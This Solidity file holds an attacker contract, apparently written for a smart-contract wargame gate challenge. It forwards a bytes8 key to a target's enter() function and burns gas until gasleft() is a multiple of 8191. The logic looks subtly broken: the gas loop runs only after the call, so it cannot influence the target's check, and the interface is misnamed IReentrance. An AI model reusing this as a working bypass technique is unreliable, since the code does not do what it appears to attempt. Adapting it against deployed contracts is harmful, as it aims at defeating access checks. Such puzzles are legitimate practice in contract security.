// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function enter(bytes8 _gateKey) external;
}

contract ContractB {
    IReentrance public target;
    bool public firstCall = true;
    uint256 private counter = 0;

    constructor (address _contractAAddress) {
        target = IReentrance(_contractAAddress);
    }

    function run(bytes8 key) public {
        target.enter(key);
        while (gasleft() % 8191 != 0) {
            counter += 1; 
        }
	}

}